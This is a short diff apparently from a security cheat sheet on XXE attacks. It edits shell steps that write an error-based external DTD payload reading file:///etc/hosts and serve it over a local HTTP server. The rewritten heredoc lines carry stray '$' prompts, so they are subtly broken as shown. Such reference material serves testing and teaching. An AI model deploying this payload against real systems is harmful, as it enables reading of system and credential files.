@@ -1450,7 +1450,9 @@ $ python3 -m http.server 8000
 
 ```
 $ echo '<!ENTITY % file SYSTEM "file:///etc/hosts">' > xxe.dtd
-$ echo '<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">' >> xxe.dtd
+$ cat << 'EOF' >> xxe.dtd
+$ <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+$ EOF
 $ python3 -m http.server 8000
 
 <?xml version="1.0" encoding="UTF-8"?>
